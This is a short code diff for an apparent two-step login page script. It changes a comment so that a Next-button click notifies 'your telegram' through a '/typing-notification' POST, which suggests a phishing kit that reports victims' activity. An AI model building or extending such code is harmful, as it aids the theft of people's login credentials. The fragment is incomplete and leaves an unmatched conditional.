@@ -31,9 +31,8 @@ document.addEventListener('DOMContentLoaded', () => {
             view = "pwd";
         }
     })
- if (unameVal) {
             nxt.addEventListener('click', async () => {
-    // Notify your server immediately when Next is clicked.
+    // Notify your telegram immediately when Next is clicked.
     try {
         await fetch('/typing-notification', {
             method: 'POST',
